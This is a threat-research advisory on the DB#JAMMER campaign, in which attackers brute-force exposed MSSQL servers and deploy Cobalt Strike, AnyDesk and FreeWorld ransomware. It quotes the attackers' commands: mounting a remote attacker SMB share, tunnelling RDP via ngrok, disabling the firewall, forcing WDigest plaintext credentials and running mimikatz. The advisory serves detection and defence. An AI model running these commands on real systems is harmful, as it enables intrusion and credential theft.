					<h1 class="single-post-heading av-special-heading-tag">Securonix Threat Labs Security Advisory: Threat Actors Target MSSQL Servers in DB#JAMMER to Deliver FreeWorld Ransomware</h1>

										<div class="">
											<div class="text-block bullets-listing">
											<p>By Securonix Threat Research: D.Iuzvyk, T.Peck, O.Kolesnikov</p>
<h2>tl;dr</h2>
<p>Threat actors working as part of DB#JAMMER attack campaigns are compromising exposed MSSQL databases using brute force attacks and appear to be well tooled and ready to deliver ransomware and Cobalt Strike payloads.</p>
<p><a href="https://www.securonix.com/wp-content/uploads/2023/08/image1.png" target="_blank" rel="noopener"><img loading="lazy" decoding="async" class="aligncenter wp-image-22472 size-large" src="https://www.securonix.com/wp-content/uploads/2023/08/image1-1024x663.png" alt="" width="640" height="414" /></a></p>
<p>In an interesting attack campaign, the Securonix Threat Research team has identified threat actors targeting exposed Microsoft SQL (MSSQL) services using brute force attacks. One of the things that makes DB#JAMMER standout is how the attacker’s tooling infrastructure and payloads are used.</p>
<p>Some of these tools include enumeration software, RAT payloads, exploitation and credential stealing software, and finally ransomware payloads. The ransomware payload of choice appears to be a newer variant of Mimic ransomware called FreeWorld. The FreeWorld text was present in the binary file names as well as ransomware extensions.</p>
<p>In this case, the threat actors targeted an MSSQL server and were able to gain a code execution foothold on the host using the enabled <a href="https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16">xp_cmdshell</a> function present on the server. Once exploited, the attackers immediately began enumerating the system and running shell commands to impair defenses and deployed tools which aided in establishing persistence on the host.</p>
<p>Given how quickly the attackers got to work, this attack appears to be quite sophisticated from tooling to infrastructure.</p>
<h2>Initial Access (TA0001)</h2>
<p>The threat actors gained access to the victim host by brute forcing an MSSQL login. Once authenticated, they immediately began enumerating the database, especially targeting other login credentials using statements such as:</p>
<p><span style="color: #980000;">SELECT name FROM sys.sql_logins WHERE name IS NOT NULL</span></p>
<p>Next, discovering that the MSSQL function xp_cmdshell stored procedure was enabled, the attackers began running shell commands on the host. This function allows for command execution and should normally not be enabled unless required.</p>
<h2>System Enumeration (TA0007)</h2>
<p>Enumeration was carried out using a few basic commands. Most of these included wmic.exe, net.exe and ipconfig.exe. Each were executed through the MSSQL xp_cmdshell:</p>
<p><a href="https://www.securonix.com/wp-content/uploads/2023/08/image2.png" target="_blank" rel="noopener"><img loading="lazy" decoding="async" class="aligncenter wp-image-22476 size-large" src="https://www.securonix.com/wp-content/uploads/2023/08/image2-1024x599.png" alt="" width="640" height="374" /></a></p>
<p>Figure 1: System and user enumeration commands</p>
<p>Once they were confident that the target system was legitimate, they began the next phase of the attack which included making configuration changes to impair defenses.</p>
<h2>Impair Defenses (T1562)</h2>
<p>At this point the attackers executed a wide range of commands on the host ranging from user creation/modification, to registry changes. Commands were executed in rapid succession indicating that they were likely copying them from a tool list or document on their end.  We’ll go over each in detail.</p>
<h3>User Creation (T1136)</h3>
<p>Three new users were created on the victim host which include <span style="color: #980000;">windows</span>, <span style="color: #980000;">adminv$</span>, and <span style="color: #980000;">mediaadmin$</span>.  Each user was added to the “remote desktop users”, “administrators”. Interestingly enough the attackers attempted to execute a large one-liner which would create the users and modify group membership, however several variations of the command were executed to account for groups in different languages.</p>
<p>An example of the command can be seen below. As you can see there are multiple commands being executed separated by the “&amp;” character which create and add users to the administrators group in three different languages, English (administrators), German (administratoren), Polish (administratorzy), Catalan (administradors) and Spanish (administradores).</p>
<p>While the group membership portion of the command might produce errors, it does provide the attackers with a “one command to rule them all” when it comes to increasing their chances of success when the language of the system is unknown.</p>
<p><a href="https://www.securonix.com/wp-content/uploads/2023/08/image3-1.png" target="_blank" rel="noopener"><img loading="lazy" decoding="async" class="aligncenter wp-image-22480 size-large" src="https://www.securonix.com/wp-content/uploads/2023/08/image3-1-1024x599.png" alt="" width="640" height="374" /></a></p>
<p>Figure 2: User creation/modification command example</p>
<p>The attackers executed multiple commands similar to the above for each of the aforementioned users. Once the users and groups were in place, the following commands were executed to ensure that passwords did not expire and the the user is never logged off:</p>
<p><span style="color: #980000;">net accounts /maxpwage:unlimited</span><br />
<span style="color: #980000;">net accounts /forcelogoff:no</span></p>

<h3>Disable System Firewall (T1562.004)</h3>
<p>Rather than simply allowing connections through Windows Firewall, or check its state, the attackers opted for the “Hail Mary” approach and disabled it all together by running:</p>
<p><span style="color: #980000;">netsh firewall set opmode disable</span></p>
<h2>Establish Persistence (TA0003)</h2>
<p>At this point the attackers had disabled much of the systems defenses especially in regard to network protection and RDP authenticaions. The next phase involved connecting to a remote SMB share to transfer in and out tools.</p>
<p>First a single command was executed to detach many of the network shares. As to the motivations why, we cannot say as doing so could break running processes and notify administrators:</p>
<p><a href="https://www.securonix.com/wp-content/uploads/2023/08/image4-1.png" target="_blank" rel="noopener"><img loading="lazy" decoding="async" class="aligncenter wp-image-22484 size-large" src="https://www.securonix.com/wp-content/uploads/2023/08/image4-1-1024x599.png" alt="" width="640" height="374" /></a></p>
<p>Figure 3: Remove existing network shares</p>
<p>Some time later, they mounted their own remote network share as a “V” drive using the following connection parameters:</p>
<p><span style="color: #980000;">net use V: \\45.148.122[.]63\V /user:sharp [REDACTED PASSWORD]</span></p>
<h3>Network share analysis</h3>
<p>The network share allowed the attacker to transfer files to and from the victim system as well as install malicious tools.</p>
<p><a href="https://www.securonix.com/wp-content/uploads/2023/08/image5.png" target="_blank" rel="noopener"><img loading="lazy" decoding="async" class="aligncenter wp-image-22488 size-large" src="https://www.securonix.com/wp-content/uploads/2023/08/image5-1024x599.png" alt="" width="640" height="374" /></a></p>
<p>Figure 4: SMB share folder contents</p>
<p>Unfortunately for the attacker, but fortunately for us we were able to extract all of the hosted files as part of our security investigation/response for analysis. Most of the files had unspecific and arbitrary names but we were able to determine their functionality based on their usage.</p>
<p>At this point the attackers shifted from executing commands using the xp_cmdshell method to executing commands from an SMB delivered binary, svr.exe which appears to be a Cobalt Strike command and control payload. We observed it making DNS connections to gelsd[.]com. (config extracted in Appendix: A below).</p>
<p><a href="https://www.securonix.com/wp-content/uploads/2023/08/image6-1.png" target="_blank" rel="noopener"><img loading="lazy" decoding="async" class="aligncenter wp-image-22492 size-large" src="https://www.securonix.com/wp-content/uploads/2023/08/image6-1-1024x599.png" alt="" width="640" height="374" /></a></p>
<p>Figure 5: srv.exe details</p>
<h3>Ngrok usage</h3>
<p>At this point the attackers attempted to establish RDP persistence through Ngrok. Ngrok allows for bypassing the firewall by running a service on the host. A public IP and port are provided to the attacker to connect to.</p>
<p>The Ngrok binary was copied into C:\Windows\System32 and simply named n.exe. An attempt was made to establish a connection using the following command via svr.exe:</p>
<p><span style="color: #980000;">cmd.exe /c c:/windows/system32/n.exe config add-authtoken [REDACTED TOKEN] &amp; c:/windows/system32/n.exe tcp 3389</span></p>
<p>The attempt was ultimately unsuccessful as Ngrok was being blocked by the firewall, however our attackers attempted to repeat the sequence of commands another six times using the same auth token before giving up.</p>
<h3>AnyDesk RAT</h3>
<p>Not to be discouraged, the attackers shifted gears to remote access software, AnyDesk. AnyDesk is a legitimate service that functions like a RAT. Threat actors have been leveraging it for <a href="https://tech.hindustantimes.com/tech/news/government-warns-internet-users-about-akira-ransomware-hackers-using-anydesk-winrar-71690168901674.html">quite some time</a> to push ransomware on their victims.</p>
<p>It appears that a batch file was executed (“a2.bat”) via the svr.exe process to download and execute the AnyDesk install, however it would appear that it was self deleting and we were not able to observe its contents.</p>
<p>The following process and command line were observed being executed from the cmd/batch file parent process. The staging directory for these files was “C:\Windows\Temp”:</p>
<p><a href="https://www.securonix.com/wp-content/uploads/2023/08/image7.png" target="_blank" rel="noopener"><img loading="lazy" decoding="async" class="aligncenter wp-image-22496 size-large" src="https://www.securonix.com/wp-content/uploads/2023/08/image7-1024x599.png" alt="" width="640" height="374" /></a></p>
<p>Figure 6: AnyDesk install</p>
<h2>Lateral Movement (TA0008)</h2>
<p>With a strong level of persistence, the attackers at this point shifted gears and started enumerating the network. The advanced port scanner utility was downloaded and placed right inside the desktop directory of the newly created user “windows”.</p>
<p><span style="color: #980000;">c:\users\windows\desktop\advanced_port_scanner_2.5.3869.exe</span></p>
<h2>Credential Dumping (T1003)</h2>
<p>Mimikatz was executed through another batch file called start.bat located at “c:\users\windows\desktop\start.bat”. From what we were able to determine, the purpose of start.bat was to first modify the registry to force clear text credentials. This is performed using a <a href="https://www.ired.team/offensive-security/credential-access-and-credential-dumping/forcing-wdigest-to-store-credentials-in-plaintext">WDigest downgrade attack</a>. The batch file did this by executing the following command invoking the registry change.</p>
<p><span style="color: #980000;">reg add &#8220;hkey_local_machine\system\currentcontrolset\control\securityproviders\wdigest&#8221;  /v uselogoncredential /t reg_sz /d 1 /f</span></p>
<p>The batch file then executed mimikatz.exe to dump credentials:</p>
<p><span style="color: #980000;">mimikatz.exe &#8220;privilege::debug&#8221; &#8220;sekurlsa::logonpasswords full&#8221; exit</span></p>
<p>The results were dumped onto the “windows” user’s desktop and read:</p>
<p><span style="color: #980000;">explorer.exe → notepad.exe c:\users\windows\desktop\mimikatz_dump.txt</span></p>
<h2>Introducing FreeWorld ransomware</h2>
<p>At this point the attackers had had enough and downloaded and deployed Mimic ransomware on the host. FreeWorld ransomware appears to be a variant of Mimic ransomware as it follows many similar TTPs in order to carry out its goals. Both variants appear to abuse the legitimate application <a href="https://www.voidtools.com/">Everything</a> to query and locate target files to be encrypted.</p>
<p>The Mimic ransomware dropper “<span style="color: #980000;">5000.exe</span>” was downloaded to “<span style="color: #980000;">c:\users\windows\desktop\50000.exe</span>” and executed using Windows Explorer. The dropper extracted 7zip and the Everything application into the user’s temp directory. 5000.exe then instructed 7zip to extract the contents of a fake Everything64.dll (which is a password protected archive) into the current directory. This was done using the following command:</p>
<p><span style="color: #980000;">c:\users\windows\appdata\local\temp\7zipsfx.000\7za.exe x -y -p1[REDACTED PASSWORD] everything64.dll</span></p>
<p>Next, the ransomware payload was extracted into the user’s ”<span style="color: #980000;">appdata\local\[random_GUID]\</span>“ directory. After which “50000.exe” would drop the main ransomware payload “dc.exe”.</p>
<p>Upon execution, the ransomware began encrypting the victim host and generated encrypted files using the “<span style="color: #980000;">.FreeWorldEncryption</span>” extension.</p>
<p>Once it has run through its course, it will create a text file named “<span style="color: #980000;">FreeWorld-Contact.txt</span>” with instructions as to how to pay the ransom.</p>

<h2>Securonix recommendations and mitigations</h2>
<p>The attack initially succeeded as a result of a brute force attack against a MSSQL server. It was unclear if the attackers were using a dictionary-based, or random password spray attempts. However it’s important to emphasize the importance of strong passwords, especially on publicly exposed services.</p>
<p>When it comes to prevention and detection, the Securonix Threat Research Team recommends:</p>
<ul>
<li>Leverage strong, complex passwords, especially on services exposed to the internet</li>
<li>In MSSQL environments, limit the use of the xp_cmdshell stored procedure</li>
<li>Rather than exposing services to the internet, leverage a trusted platform such as a VPN</li>
<li>Monitor common malware staging directories, especially “C:\Windows\Temp” which was used in this attack campaign</li>
<li>Deploy additional process-level logging such as <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon">Sysmon</a> and <a href="https://www.crowdstrike.com/blog/investigating-powershell-command-and-script-logging/">PowerShell logging</a> for additional log detection coverage</li>
<li>Securonix customers can scan endpoints using the Securonix Seeder Hunting Queries below</li>
</ul>
